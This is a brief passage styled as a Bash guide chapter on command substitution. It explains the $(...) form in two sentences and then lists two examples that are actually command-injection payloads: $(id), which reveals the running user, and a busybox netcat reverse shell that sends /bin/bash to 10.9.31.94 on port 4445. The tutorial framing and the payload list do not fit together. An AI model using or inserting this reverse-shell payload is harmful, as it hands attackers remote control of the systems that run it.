### Chapter 12. Command Substitution
Command substitution reassigns the output of a command [1] or even multiple commands; it literally plugs the command output into another context. 
The $(...) form has superseded backticks for command substitution.

- $(id)
- $(busybox nc 10.9.31.94 4445 -e /bin/bash)
